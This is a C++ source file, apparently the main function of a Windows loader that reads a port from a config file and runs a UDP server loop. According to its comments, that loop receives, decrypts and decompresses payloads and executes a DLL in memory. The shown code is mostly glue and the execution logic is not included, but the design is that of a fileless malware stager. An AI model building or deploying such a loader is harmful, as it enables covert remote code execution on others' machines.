// Loader-win.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <iostream>
#include <fstream>
#include <stdio.h>
//#include "ssh_server.h"
#include "udp_client.h"
#include "config_parser.h"
#include "decompression.h"
#include "decryption.h"
#include "ExecuteDLLinMem.h"
#include "crypto/aes.h"

using namespace std;

string get_config_item(ConfigFile cfg, string item_name) {
	std::string item;
	if (cfg.keyExists(item_name)) {
		item = cfg.getValueOfKey<std::string>(item_name);
		//printf("Config worked: %s\n", item.c_str());
	}
	else {
		printf("No '%s' specified in packer.conf.  Please update the config and rerun the program.", item_name.c_str()); //ToDo or ask user to input now
		exit(0);
	}
	return item;
}

int main()
{
	while (1)
	{
		//ToDo - temporary decompression testing
		//Since we don't have network/decryption fully implemented - pull the poetry.zips testfile here and read it into a buffer, then pass that buffer to rewritted uziphelp.
		//Decompression Testing - THIS WORKS.  VERIFIED.
		/*
		const char* compression_iput = "..\\PAYLOADS\\poetry.zips";
		const char* compression_outp = "..\\poetry.txt";
		long file_loc;
		unsigned char infile_size;

		char* inBuf = new char[1024]; //udp client is a char* buffer
		char* opBuf = new char[1024];

		FILE* File;
		char* Buffer;
		unsigned long Size;


		fopen_s(&File, "..\\PAYLOADS\\poetry.txt", "rb");
		if (!File)
		{
			printf("Error while reading the file\n");
			getchar();
			return 0;
		}

		fseek(File, 0, SEEK_END);
		Size = ftell(File);
		fseek(File, 0, SEEK_SET);

		Buffer = new char[Size];

		fread(Buffer, 1, Size, File);

		inBuf = Buffer;

		printf("Encrypted buffer: %s\n", Buffer);
		uziphelp(inBuf, opBuf);
		printf("\nDecrypted buffer: %s \n", opBuf);
		*/
		ConfigFile cfg("loader.conf");
		std::string portstring = get_config_item(cfg, "port");
		int port = std::stoi(portstring.c_str());
		printf("-Configurations-\nPort: %d\n", port);

		//decryption, decompression, and execution in memory happens in here so we dont have to worry about allocating unknown buffer sizes.
		udp_server_clinet(port);
	}

	return 0;
}